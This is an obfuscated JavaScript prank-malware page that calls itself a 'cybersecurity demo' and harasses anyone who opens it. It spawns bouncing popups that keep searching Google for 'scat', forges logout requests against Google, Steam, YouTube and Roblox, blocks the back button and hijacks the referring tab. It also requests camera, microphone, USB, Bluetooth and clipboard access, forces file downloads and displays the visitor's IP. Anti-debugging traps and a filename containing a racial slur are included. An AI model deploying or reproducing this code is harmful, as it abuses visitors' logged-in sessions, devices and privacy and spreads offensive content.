const SCREEN_WIDTH = window.screen.availWidth;
const SCREEN_HEIGHT = window.screen.availHeight;
const SEARCHES = ["scat"]; // Restored as requested
const VIDEOS = ['Wagner.mp4', 'salad.mp4', '0801.mp4', "audio.destroy.mp4", 'mama.mp4', "apoop22.mp4']; // Generic video names
const FILE_DOWNLOADS = ["nigga_poop.gif", "poop_virus.gif"]; // Generic file names
const PHRASES = ["HACKED BY POOP THUGS", "KAIBA SCRIPTING MAN"];
const _0x368b8a = {
  action_logout: '1'
};
const _0x3f3fda = {
  Google: ["GET", "https://www.google.com/accounts/Logout"],
  "Steam Community": ["GET", "https://steamcommunity.com/?action=doLogout"],
  "Steam Store": ['GET', "https://store.steampowered.com/logout/"],
  "YouTube": ['POST', "https://www.youtube.com", _0x368b8a],
  "Roblox": ['POST', "https://www.roblox.com/authentication/logout"]
};
const wins = [];
let interactionCount = 0x0;
let numSuperLogoutIframes = 0x0;
const isChildWindow = window.opener && isParentSameOrigin() || window.location.search.indexOf("child=true") !== -0x1;
const isParentWindow = !isChildWindow;
init();
if (isChildWindow) {
  initChildWindow();
} else {
  initParentWindow();
}
function init() {
  const _0x13958c = function () {
    let _0x2b674f = true;
    return function (_0x41bb4d, _0x40df10) {
      const _0x1bd0a1 = _0x2b674f ? function () {
        if (_0x40df10) {
          const _0x92b410 = _0x40df10.apply(_0x41bb4d, arguments);
          _0x40df10 = null;
          return _0x92b410;
        }
      } : function () {};
      _0x2b674f = false;
      return _0x1bd0a1;
    };
  }();
  (function () {
    _0x13958c(this, function () {
      const _0x1ead74 = new RegExp("function *\\( *\\)");
      const _0x126daa = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
      const _0x1d2368 = _0x1775f2('init');
      if (!_0x1ead74.test(_0x1d2368 + "chain") || !_0x126daa.test(_0x1d2368 + "input")) {
        _0x1d2368('0');
      } else {
        _0x1775f2();
      }
    })();
  })();
  const _0x4d505a = function () {
    let _0x278a68 = true;
    return function (_0x2a499f, _0x5c787e) {
      const _0x1a7905 = _0x278a68 ? function () {
        if (_0x5c787e) {
          const _0x4b55a6 = _0x5c787e.apply(_0x2a499f, arguments);
          _0x5c787e = null;
          return _0x4b55a6;
        }
      } : function () {};
      _0x278a68 = false;
      return _0x1a7905;
    };
  }();
  const _0x2b4a53 = _0x4d505a(this, function () {
    let _0x37cc5e;
    try {
      const _0xa93c45 = Function("return (function() {}.constructor(\"return this\")( ));");
      _0x37cc5e = _0xa93c45();
    } catch (_0x45f62c) {
      _0x37cc5e = window;
    }
    const _0x557d7b = _0x37cc5e.console = _0x37cc5e.console || {};
    const _0x38b7fd = ['log', "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x110fba = 0x0; _0x110fba < _0x38b7fd.length; _0x110fba++) {
      const _0x2b8651 = _0x4d505a.constructor.prototype.bind(_0x4d505a);
      const _0x49ec62 = _0x38b7fd[_0x110fba];
      const _0x2a70cf = _0x557d7b[_0x49ec62] || _0x2b8651;
      _0x2b8651.__proto__ = _0x4d505a.bind(_0x4d505a);
      _0x2b8651.toString = _0x2a70cf.toString.bind(_0x2a70cf);
      _0x557d7b[_0x49ec62] = _0x2b8651;
    }
  });
  _0x2b4a53();
  confirmPageUnload();
  interceptUserInput(async _0x4d3be1 => {
    interactionCount += 0x1;
    _0x4d3be1.preventDefault();
    _0x4d3be1.stopPropagation();
    if (interactionCount === 0x1) {
      await showUserIP();
    }
    if (_0x4d3be1.which !== 0x0) {
      openWindow();
    }
    startVibrateInterval();
    enablePictureInPicture();
    triggerFileDownload();
    focusWindows();
    copySpamToClipboard();
    speak();
    startTheramin();
    if (_0x4d3be1.key === "Meta" || _0x4d3be1.key === "Control") {
      window.print();
      requestWebauthnAttestation();
      window.print();
      requestWebauthnAttestation();
      window.print();
      requestWebauthnAttestation();
    } else {
      requestPointerLock();
      requestFullscreen();
      requestClipboardRead();
      requestMidiAccess();
      requestBluetoothAccess();
      requestUsbAccess();
      requestSerialAccess();
      requestHidAccess();
      requestCameraAndMic();
      if (Math.random() < 0.1) {
        requestWebauthnAttestation();
      }
    }
  });
}
function initChildWindow() {
  registerProtocolHandlers();
  hideCursor();
  moveWindowBounce();
  setupFollowWindow();
  startVideo();
  detectWindowClose();
  triggerFileDownload();
  speak();
  rainbowThemeColor();
  animateUrlWithEmojis();
  interceptUserInput(_0x45f000 => {
    if (interactionCount === 0x1) {
      startAlertInterval();
    }
  });
}
function initParentWindow() {
  const _0x2075d9 = function () {
    let _0x3a7cd5 = true;
    return function (_0x216f5a, _0x2a60f2) {
      const _0x222af3 = _0x3a7cd5 ? function () {
        if (_0x2a60f2) {
          const _0x20887c = _0x2a60f2.apply(_0x216f5a, arguments);
          _0x2a60f2 = null;
          return _0x20887c;
        }
      } : function () {};
      _0x3a7cd5 = false;
      return _0x222af3;
    };
  }();
  const _0x4628b5 = _0x2075d9(this, function () {
    return _0x4628b5.toString().search("(((.+)+)+)+$").toString().constructor(_0x4628b5).search("(((.+)+)+)+$");
  });
  _0x4628b5();
  showHelloMessage();
  blockBackButton();
  fillHistory();
  startInvisiblePictureInPictureVideo();
  interceptUserInput(_0x22fab3 => {
    if (interactionCount === 0x1) {
      registerProtocolHandlers();
      attemptToTakeoverReferrerWindow();
      hideCursor();
      startVideo();
      startAlertInterval();
      superLogout();
      removeHelloMessage();
      rainbowThemeColor();
      animateUrlWithEmojis();
      speak("DEMO HACK IN PROGRESS");
    }
  });
  document.body.addEventListener("click", async () => {
    await showUserIP();
  });
}
function attemptToTakeoverReferrerWindow() {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = window.location.origin + '/?child=true';
  }
}
function isParentSameOrigin() {
  try {
    return window.opener.location.origin === window.location.origin;
  } catch (_0x3dc8f5) {
    return false;
  }
}
function confirmPageUnload() {
  window.addEventListener("beforeunload", _0x4d846c => {
    speak("HACKED BY DEMO!");
    _0x4d846c.returnValue = true;
  });
}
function registerProtocolHandlers() {
  if (typeof navigator.registerProtocolHandler !== 'function') {
    return;
  }
  const _0x19eabf = ["bitcoin", 'geo', 'im', "irc", "ircs", 'magnet', "mailto", "mms", "news", "ircs", "nntp", "sip", 'sms', "smsto", "ssh", 'tel', "urn", "webcal", "wtai", "xmpp"];
  const _0x5301fc = window.location.href + "/url=%s";
  _0x19eabf.forEach(_0x1e3bd3 => {
    navigator.registerProtocolHandler(_0x1e3bd3, _0x5301fc, "Demo Handler");
  });
}
function requestCameraAndMic() {
  if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== "function") {
    return;
  }
  navigator.mediaDevices.enumerateDevices().then(_0x4b20fe => {
    const _0x319d2d = _0x4b20fe.filter(_0x477c90 => _0x477c90.kind === "videoinput");
    if (_0x319d2d.length === 0x0) {
      return;
    }
    const _0x586a5f = _0x319d2d[_0x319d2d.length - 0x1];
    const _0x2c9ce2 = {
      'deviceId': _0x586a5f.deviceId,
      'facingMode': ['user', "environment"],
      'audio': true,
      'video': true
    };
    navigator.mediaDevices.getUserMedia(_0x2c9ce2).then(_0x14383a => {
      const _0x3c3a83 = _0x14383a.getVideoTracks()[0x0];
      const _0x995ec1 = new window.ImageCapture(_0x3c3a83);
      _0x995ec1.getPhotoCapabilities().then(() => {
        const _0x980025 = {
          'advanced': []
        };
        _0x3c3a83.applyConstraints(_0x980025);
      }, () => {});
    }, () => {});
  });
}
function animateUrlWithEmojis() {
  if (window.ApplePaySession) {
    return;
  }
  const _0x40b9e7 = Math.random();
  if (_0x40b9e7 < 0.33) {
    _0xb46104();
  } else if (_0x40b9e7 < 0.67) {
    _0x50f7f3();
  } else {
    _0x31f9f3();
  }
  function _0xb46104() {
    const _0x71ce17 = ['🏻', '🏼', '🏽', '🏾', '🏿'];
    setInterval(() => {
      let _0x3b5e91 = '';
      let _0x3bce24;
      let _0xb4c916;
      for (_0x3bce24 = 0x0; _0x3bce24 < 0xa; _0x3bce24++) {
        _0xb4c916 = Math.floor(_0x71ce17.length * ((Math.sin(Date.now() / 0x64 + _0x3bce24) + 0x1) / 0x2));
        _0x3b5e91 += '👶' + _0x71ce17[_0xb4c916];
      }
      window.location.hash = _0x3b5e91;
    }, 0x64);
  }
  function _0x50f7f3() {
    setInterval(() => {
      let _0x4aa08f;
      let _0x245d65;
      let _0x385871 = '';
      for (_0x4aa08f = 0x0; _0x4aa08f < 0xa; _0x4aa08f++) {
        _0x245d65 = Math.floor(Math.sin(Date.now() / 0xc8 + _0x4aa08f / 0x2) * 0x4) + 0x4;
        _0x385871 += String.fromCharCode(0x2581 + _0x245d65);
      }
      window.location.hash = _0x385871;
    }, 0x64);
  }
  function _0x31f9f3() {
    const _0x12734c = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'];
    const _0x289d36 = [0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0];
    let _0x40cbb5 = 0x0;
    setInterval(() => {
      let _0xa5d62a = '';
      let _0xf410c9 = 0x0;
      if (!_0x40cbb5) {
        while (_0x289d36[_0xf410c9] === 0x4) {
          _0xf410c9++;
        }
        if (_0xf410c9 >= _0x289d36.length) {
          _0x40cbb5 = 0x1;
        } else {
          _0x289d36[_0xf410c9]++;
        }
      } else {
        while (_0x289d36[_0xf410c9] === 0x0) {
          _0xf410c9++;
        }
        if (_0xf410c9 >= _0x289d36.length) {
          _0x40cbb5 = 0x0;
        } else {
          _0x289d36[_0xf410c9]++;
          if (_0x289d36[_0xf410c9] === 0x8) {
            _0x289d36[_0xf410c9] = 0x0;
          }
        }
      }
      _0x289d36.forEach(function (_0x354525) {
        _0xa5d62a += _0x12734c[_0x354525];
      });
      window.location.hash = _0xa5d62a;
    }, 0x64);
  }
}
function requestPointerLock() {
  const _0x23fd85 = document.body.requestPointerLock || document.body.webkitRequestPointerLock || document.body.mozRequestPointerLock || document.body.msRequestPointerLock;
  _0x23fd85.call(document.body);
}
function startVibrateInterval() {
  if (typeof window.navigator.vibrate !== "function") {
    return;
  }
  setInterval(() => {
    const _0x33b5b0 = Math.floor(Math.random() * 0x258);
    window.navigator.vibrate(_0x33b5b0);
  }, 0x3e8);
  window.addEventListener("gamepadconnected", _0x281fd4 => {
    const _0x47f438 = _0x281fd4.gamepad;
    if (_0x47f438.vibrationActuator) {
      setInterval(() => {
        if (_0x47f438.connected) {
          _0x47f438.vibrationActuator.playEffect("dual-rumble", {
            'duration': Math.floor(Math.random() * 0x258),
            'strongMagnitude': Math.random(),
            'weakMagnitude': Math.random()
          });
        }
      }, 0x3e8);
    }
  });
}
function interceptUserInput(_0x596a92) {
  const _0x78637f = {
    "passive": false
  };
  document.body.addEventListener("touchstart", _0x596a92, _0x78637f);
  document.body.addEventListener("mousedown", _0x596a92);
  document.body.addEventListener('mouseup', _0x596a92);
  document.body.addEventListener("click", _0x596a92);
  document.body.addEventListener('keydown', _0x596a92);
  document.body.addEventListener('keyup', _0x596a92);
  document.body.addEventListener('keypress', _0x596a92);
}
function startInvisiblePictureInPictureVideo() {
  const _0x5de22e = document.createElement("video");
  _0x5de22e.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)];
  _0x5de22e.loop = true;
  _0x5de22e.muted = true;
  _0x5de22e.style = "position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;";
  _0x5de22e.autoplay = true;
  _0x5de22e.play();
  document.body.appendChild(_0x5de22e);
}
function enablePictureInPicture() {
  const _0x95910d = document.querySelector('video');
  if (document.pictureInPictureEnabled && _0x95910d) {
    _0x95910d.style = '';
    _0x95910d.muted = false;
    _0x95910d.requestPictureInPicture();
    _0x95910d.play();
  }
}
function focusWindows() {
  wins.forEach(_0x23108b => {
    if (!_0x23108b.closed) {
      _0x23108b.focus();
    }
  });
}
function openWindow() {
  const {
    x: _0x1e300b,
    y: _0x12267c
  } = getRandomCoords();
  const _0x580984 = "width=500,height=500,left=" + _0x1e300b + ",top=" + _0x12267c;
  const _0x1ed018 = window.open(window.location.pathname, '', _0x580984);
  if (!_0x1ed018) {
    return;
  }
  wins.push(_0x1ed018);
  if (wins.length === 0x2) {
    setupSearchWindow(_0x1ed018);
  }
}
function hideCursor() {
  document.querySelector("html").style = "cursor: none;";
}
function triggerFileDownload() {
  const _0x431671 = FILE_DOWNLOADS[Math.floor(Math.random() * FILE_DOWNLOADS.length)];
  const _0x4d8082 = document.createElement('a');
  _0x4d8082.href = _0x431671;
  _0x4d8082.download = _0x431671;
  _0x4d8082.click();
}
function speak(_0x4b9bf2) {
  if (_0x4b9bf2 == null) {
    _0x4b9bf2 = PHRASES[Math.floor(Math.random() * PHRASES.length)];
  }
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(_0x4b9bf2));
}
function startTheramin() {
  const _0x695743 = new AudioContext();
  const _0x59bf9c = _0x695743.createOscillator();
  const _0x2fb22c = _0x695743.createGain();
  const _0x2d556e = _0x695743.createPeriodicWave(Array(0xa).fill(0x0).map((_0x18d250, _0x1cf77d) => Math.cos(_0x1cf77d)), Array(0xa).fill(0x0).map((_0x52db09, _0x197c6e) => Math.sin(_0x197c6e)));
  _0x59bf9c.setPeriodicWave(_0x2d556e);
  _0x59bf9c.connect(_0x2fb22c);
  _0x2fb22c.connect(_0x695743.destination);
  _0x59bf9c.start(0x0);
  const _0x5a724e = ({
    pitch: _0x67b497,
    volume: _0x1872f2
  }) => {
    _0x59bf9c.frequency.value = 0x32 + _0x67b497 * 0xfa0;
    _0x2fb22c.gain.value = _0x1872f2 * 0.5;
  };
  document.body.addEventListener("mousemove", _0xd1e30 => {
    const {
      clientX: _0x9bfd1,
      clientY: _0xceb9af
    } = _0xd1e30;
    const {
      clientWidth: _0x19d8e3,
      clientHeight: _0x2aefc3
    } = document.body;
    const _0x5c4af1 = (_0x9bfd1 - _0x19d8e3 / 0x2) / _0x19d8e3;
    const _0x5266d = (_0xceb9af - _0x2aefc3 / 0x2) / _0x2aefc3;
    const _0x37c0dc = {
      'pitch': _0x5c4af1,
      'volume': _0x5266d
    };
    _0x5a724e(_0x37c0dc);
  });
}
function requestClipboardRead() {
  try {
    navigator.clipboard.readText().then(_0x50426 => {
      if (!window.ApplePaySession) {
        window.alert("Successfully read data from clipboard: '" + _0x50426 + "'");
      }
    }, () => {});
  } catch {}
}
function requestWebauthnAttestation() {
  try {
    const _0x56fa08 = {
      'name': 'Demo'
    };
    const _0x3e3af0 = {
      'publicKey': {
        'rp': _0x56fa08,
        'user': {
          'id': new Uint8Array(0x10),
          'name': "HACKED_BY_DEMO",
          'displayName': "DEMO HACK"
        },
        'pubKeyCredParams': [{
          'type': "public-key",
          'alg': -0x7
        }],
        'attestation': "direct",
        'timeout': 0xea60,
        'challenge': new Uint8Array([0x8c, 0xa, 0x26, 0xff, 0x22, 0x91, 0xc1, 0xe9, 0xb9, 0x4e, 0x2e, 0x17, 0x1a, 0x98, 0x6a, 0x73, 0x71, 0x9d, 0x43, 0x48, 0xd5, 0xa7, 0x6a, 0x15, 0x7e, 0x38, 0x94, 0x52, 0x77, 0x97, 0xf, 0xef]).buffer
      }
    };
    const _0x2924d8 = {
      'publicKey': {
        'timeout': 0xea60,
        'challenge': new Uint8Array([0x79, 0x50, 0x68, 0x71, 0xda, 0xee, 0xee, 0xb9, 0x94, 0xc3, 0xc2, 0x15, 0x67, 0x65, 0x26, 0x22, 0xe3, 0xf3, 0xab, 0x3b, 0x78, 0x2e, 0xd5, 0x6f, 0x81, 0x26, 0xe2, 0xa6, 0x1, 0x7d, 0x74, 0x50]).buffer
      }
    };
    navigator.credentials.create(_0x3e3af0).then(_0x5d4697 => {
      const _0x2b9d9a = {
        'id': _0x5d4697.rawId,
        'transports': ["usb", "nfc", "ble"],
        'type': "public-key"
      };
      const _0x218489 = [_0x2b9d9a];
      _0x2924d8.publicKey.allowCredentials = _0x218489;
      return navigator.credentials.get(_0x2924d8);
    });
  } catch {}
}
function requestMidiAccess() {
  try {
    navigator.requestMIDIAccess();
  } catch {}
}
function requestBluetoothAccess() {
  try {
    const _0x3a1db4 = {
      'acceptAllDevices': true
    };
    navigator.bluetooth.requestDevice(_0x3a1db4).then(_0x40c2a5 => _0x40c2a5.gatt.connect());
  } catch {}
}
function requestUsbAccess() {
  try {
    const _0x47c2f5 = {
      'filters': [{}]
    };
    navigator.usb.requestDevice(_0x47c2f5);
  } catch {}
}
(function () {
  const _0x49529b = function () {
    let _0xc6077;
    try {
      _0xc6077 = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x16d576) {
      _0xc6077 = window;
    }
    return _0xc6077;
  };
  const _0x570307 = _0x49529b();
  _0x570307.setInterval(_0x1775f2, 0xfa0);
})();
function requestSerialAccess() {
  try {
    const _0x138a2a = {
      'filters': []
    };
    navigator.serial.requestPort(_0x138a2a);
  } catch {}
}
function requestHidAccess() {
  try {
    const _0xc341de = {
      'filters': []
    };
    navigator.hid.requestDevice(_0xc341de);
  } catch {}
}
function moveWindowBounce() {
  let _0x550ce2 = 0x8c * (Math.random() > 0.5 ? 0x1 : -0x1); // Increased speed (0x46 to 0x8c)
  let _0x52c2d2 = 0x8c * (Math.random() > 0.5 ? 0x1 : -0x1); // Increased speed (0x46 to 0x8c)
  setInterval(() => {
    const _0xfeaca5 = window.screenX;
    const _0x3c509f = window.screenY;
    const _0x29289b = window.outerWidth;
    const _0x408cb9 = window.outerHeight;
    if (_0xfeaca5 < 0x8c) {
      _0x550ce2 = Math.abs(_0x550ce2);
    }
    if (_0xfeaca5 + _0x29289b > SCREEN_WIDTH - 0x8c) {
      _0x550ce2 = -0x1 * Math.abs(_0x550ce2);
    }
    if (_0x3c509f < 0x8c) {
      _0x52c2d2 = Math.abs(_0x52c2d2);
    }
    if (_0x3c509f + _0x408cb9 > SCREEN_HEIGHT - 0x8c) {
      _0x52c2d2 = -0x1 * Math.abs(_0x52c2d2);
    }
    window.moveBy(_0x550ce2, _0x52c2d2);
  }, 0x20); // Reduced interval for faster movement (0x46 to 0x20)
}
function setupFollowWindow() {
  document.addEventListener("mousemove", function (_0x9d5988) {
    window.moveTo(_0x9d5988.screenX - 250, _0x9d5988.screenY - 250);
  });
}
function startVideo() {
  const _0x57370b = document.createElement("video");
  _0x57370b.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)];
  _0x57370b.autoplay = true;
  _0x57370b.loop = true;
  _0x57370b.style = "width: 100%; height: 100%;";
  document.body.appendChild(_0x57370b);
}
function detectWindowClose() {
  window.addEventListener("unload", () => {
    if (!window.opener.closed) {
      window.opener.onCloseWindow(window);
    }
  });
}
function onCloseWindow(_0x53181e) {
  const _0x21b023 = wins.indexOf(_0x53181e);
  if (_0x21b023 >= 0x0) {
    wins.splice(_0x21b023, 0x1);
  }
}
function showHelloMessage() {
  const _0x1780b9 = document.querySelector('template');
  if (_0x1780b9) {
    const _0x3b1a53 = document.importNode(_0x1780b9.content, true);
    document.body.appendChild(_0x3b1a53);
  }
}
function removeHelloMessage() {
  const _0x1c4375 = document.querySelector(".hello-message");
  if (_0x1c4375) {
    _0x1c4375.remove();
  }
}
function rainbowThemeColor() {
  function _0x2eaa7b(_0x38e200, _0x4c86a1, _0x3b6166 = '0') {
    _0x38e200 -= _0x4c86a1.toString().length;
    if (_0x38e200 > 0x0) {
      return new Array(_0x38e200 + (/\./.test(_0x4c86a1) ? 0x2 : 0x1)).join(_0x3b6166) + _0x4c86a1;
    }
    return _0x4c86a1 + '';
  }
  const _0x4e749d = document.querySelector("meta.theme-color") || document.createElement("meta");
  _0x4e749d.setAttribute("name", "theme-color");
  document.head.appendChild(_0x4e749d);
  setInterval(() => {
    _0x4e749d.setAttribute("content", '#' + _0x2eaa7b(0x6, Math.floor(Math.random() * 0xffffff).toString(0x10)));
  }, 0x32);
}
function copySpamToClipboard() {
  const _0x2614c7 = "Cybersecurity demo\nCheck out this example!";
  clipboardCopy(_0x2614c7);
}
function clipboardCopy(_0x3a87ec) {
  const _0x3207b0 = document.createElement("span");
  _0x3207b0.textContent = _0x3a87ec;
  _0x3207b0.style.whiteSpace = "pre";
  const _0x33e404 = document.createElement("iframe");
  _0x33e404.sandbox = "allow-same-origin";
  document.body.appendChild(_0x33e404);
  let _0x57dde1 = _0x33e404.contentWindow;
  _0x57dde1.document.body.appendChild(_0x3207b0);
  let _0x9f5f9e = _0x57dde1.getSelection();
  if (!_0x9f5f9e) {
    _0x57dde1 = window;
    _0x9f5f9e = _0x57dde1.getSelection();
    document.body.appendChild(_0x3207b0);
  }
  const _0x4bbe24 = _0x57dde1.document.createRange();
  _0x9f5f9e.removeAllRanges();
  _0x4bbe24.selectNode(_0x3207b0);
  _0x9f5f9e.addRange(_0x4bbe24);
  let _0xce614a = false;
  try {
    _0xce614a = _0x57dde1.document.execCommand("copy");
  } catch (_0x3b1378) {
    console.log(_0x3b1378);
  }
  _0x9f5f9e.removeAllRanges();
  _0x3207b0.remove();
  _0x33e404.remove();
  return _0xce614a;
}
function startAlertInterval() {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert();
    } else {
      window.print();
    }
  }, 0x1d4c0);
}
function showAlert() {
  const _0x4d7e83 = "Cybersecurity demo alert!";
  window.alert(_0x4d7e83);
}
function requestFullscreen() {
  const _0x3400e5 = Element.prototype.requestFullscreen || Element.prototype.webkitRequestFullscreen || Element.prototype.mozRequestFullScreen || Element.prototype.msRequestFullscreen;
  _0x3400e5.call(document.body);
}
function superLogout() {
  function _0x246b71(_0x5ad9ed, _0x166d59) {
    if (_0x166d59) {
      _0x166d59 = false;
      return;
    }
    _0x5ad9ed.parentNode.removeChild(_0x5ad9ed);
  }
  function _0x3e1df6(_0x2f7229) {
    // Use fetch for GET requests to ensure they are sent
    fetch(_0x2f7229, {
      method: 'GET',
      mode: 'no-cors',
      credentials: 'include'
    }).catch(() => {}); // Silently handle errors
    const _0x59257a = document.createElement("img");
    _0x59257a.onload = () => _0x246b71(_0x59257a);
    _0x59257a.onerror = () => _0x246b71(_0x59257a);
    _0x59257a.style = "position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;";
    document.body.appendChild(_0x59257a);
    _0x59257a.src = _0x2f7229;
  }
  function _0x4b5432(_0x1e477a, _0x26270b) {
    const _0x252155 = document.createElement("iframe");
    _0x252155.style = "position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;";
    _0x252155.name = "iframe" + numSuperLogoutIframes;
    document.body.appendChild(_0x252155);
    numSuperLogoutIframes += 0x1;
    const _0x572763 = document.createElement('form');
    _0x572763.style = "position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;";
    let _0x1fca97 = 0x0;
    _0x252155.onload = _0x252155.onerror = () => {
      if (_0x1fca97 >= 0x1) {
        _0x246b71(_0x252155);
        _0x246b71(_0x572763);
      }
      _0x1fca97 += 0x1;
    };
    _0x572763.action = _0x1e477a;
    _0x572763.method = "POST";
    _0x572763.target = _0x252155.name;
    for (const _0x33cc90 in _0x26270b) {
      if (Object.prototype.hasOwnProperty.call(_0x26270b, _0x33cc90)) {
        const _0x259a17 = document.createElement("input");
        _0x259a17.type = "hidden";
        _0x259a17.name = _0x33cc90;
        _0x259a17.value = _0x26270b[_0x33cc90];
        _0x572763.appendChild(_0x259a17);
      }
    }
    document.body.appendChild(_0x572763);
    _0x572763.submit();
    // Additional fetch for POST to ensure request is sent
    const formData = new FormData();
    for (const _0x33cc90 in _0x26270b) {
      if (Object.prototype.hasOwnProperty.call(_0x26270b, _0x33cc90)) {
        formData.append(_0x33cc90, _0x26270b[_0x33cc90]);
      }
    }
    fetch(_0x1e477a, {
      method: 'POST',
      body: formData,
      mode: 'no-cors',
      credentials: 'include'
    }).catch(() => {});
  }
  for (const _0x2bd563 in _0x3f3fda) {
    const _0x3e1b84 = _0x3f3fda[_0x2bd563][0x0];
    const _0x2b40b1 = _0x3f3fda[_0x2bd563][0x1];
    const _0x91009 = _0x3f3fda[_0x2bd563][0x2] || {};
    if (_0x3e1b84 === "GET") {
      _0x3e1df6(_0x2b40b1);
    } else {
      _0x4b5432(_0x2b40b1, _0x91009);
    }
    const _0xf82de1 = document.createElement('div');
    _0xf82de1.innerText = "Attempting to log you out from " + _0x2bd563 + "...";
    _0xf82de1.style = "position: fixed; top: 10px; left: 10px; color: red; font-size: 20px;";
    const _0x3c5b0b = document.querySelector('.logout-messages') || document.createElement('div');
    _0x3c5b0b.className = 'logout-messages';
    document.body.appendChild(_0x3c5b0b);
    _0x3c5b0b.appendChild(_0xf82de1);
    // Remove message after 3 seconds
    setTimeout(() => _0xf82de1.remove(), 3000);
  }
}
function blockBackButton() {
  window.addEventListener("popstate", () => {
    window.history.forward();
  });
}
function fillHistory() {
  for (let _0x577017 = 0x1; _0x577017 < 0x14; _0x577017++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + _0x577017);
  }
  window.history.pushState({}, '', window.location.pathname);
}
function getRandomCoords() {
  const _0x333325 = 0x8c + Math.floor(Math.random() * (SCREEN_WIDTH - 0x1f4 - 0x8c)); // Adjusted for faster movement
  const _0x4534e9 = 0x8c + Math.floor(Math.random() * (SCREEN_HEIGHT - 0x1f4 - 0x8c));
  const _0x3ea5f1 = {
    'x': _0x333325
  };
  _0x3ea5f1.y = _0x4534e9;
  return _0x3ea5f1;
}
function setupSearchWindow(_0x4327e0) {
  if (!_0x4327e0) {
    return;
  }
  const {
    x: _0x47babf,
    y: _0x1eb543
  } = getRandomCoords();
  _0x4327e0.moveTo(_0x47babf, _0x1eb543);
  _0x4327e0.resizeTo(1000, 1000);
  _0x4327e0.window.location = "https://www.google.com/search?q=" + encodeURIComponent(SEARCHES[0]);
  let _0x456745 = 0x0; // Start at 0 since SEARCHES has only one entry
  const _0x1f9b14 = setInterval(() => {
    if (_0x4327e0.closed) {
      clearInterval(_0x1f9b14);
      onCloseWindow(_0x4327e0);
      return;
    }
    _0x4327e0.window.location = window.location.pathname;
    setTimeout(() => {
      _0x4327e0.resizeTo(0x1f4, 0x1f4);
    }, 0x100); // Reduced delay for faster pop-ups (0x1f4 to 0x100)
    setTimeout(() => {
      const {
        x: _0x46326f,
        y: _0x33793e
      } = getRandomCoords();
      _0x4327e0.moveTo(_0x46326f, _0x33793e);
      _0x4327e0.resizeTo(1000, 1000);
      _0x4327e0.window.location = "https://www.google.com/search?q=" + encodeURIComponent(SEARCHES[_0x456745]);
      _0x456745 = (_0x456745 + 1) % SEARCHES.length; // Cycle through SEARCHES
    }, 0x200); // Reduced delay for faster pop-ups (0x3e8 to 0x200)
  }, 0x400); // Reduced interval for faster pop-ups (0xbb8 to 0x400)
}
function detectBrowser() {
  const _0x151755 = navigator.userAgent;
  if (/samsungbrowser\//i.test(_0x151755)) {
    return 'samsung';
  } else {
    if (/edg\//i.test(_0x151755)) {
      return "edge";
    } else {
      if (/edga\//i.test(_0x151755)) {
        return 'edge';
      } else {
        if (/opt\//i.test(_0x151755)) {
          return "opera";
        } else {
          if (/opr\//i.test(_0x151755)) {
            return "opera";
          } else {
            if (/chrome\//i.test(_0x151755)) {
              return "chrome";
            } else {
              if (/safari\//i.test(_0x151755)) {
                return 'safari';
              } else {
                if (/firefox\//i.test(_0x151755)) {
                  return "firefox";
                }
              }
            }
          }
        }
      }
    }
  }
}
async function showUserIP() {
  if (!isParentWindow) {
    return;
  }
  try {
    const _0x4a416e = await fetch("https://api.ipify.org/");
    const _0x1e363e = await _0x4a416e.text();
    const _0x5465f3 = document.createElement('p');
    _0x5465f3.innerText = "IP: " + _0x1e363e;
    _0x5465f3.style.fontSize = "55px";
    _0x5465f3.style.position = 'absolute';
    _0x5465f3.style.top = '5%';
    _0x5465f3.style.left = "50%";
    _0x5465f3.style.transform = "translate(-50%, -50%)";
    _0x5465f3.style.color = "red";
    document.body.appendChild(_0x5465f3);
  } catch (_0x2e7131) {
    console.error("Unable to get IP address:", _0x2e7131);
  }
}
function _0x1775f2(_0x135808) {
  function _0x49adf5(_0x12427c) {
    if (typeof _0x12427c === "string") {
      return function (_0x193b2a) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + _0x12427c / _0x12427c).length !== 0x1 || _0x12427c % 0x14 === 0x0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply('stateObject');
      }
    }
    _0x49adf5(++_0x12427c);
  }
  try {
    if (_0x135808) {
      return _0x49adf5;
    } else {
      _0x49adf5(0x0);
    }
  } catch (_0x253a7e) {}
}
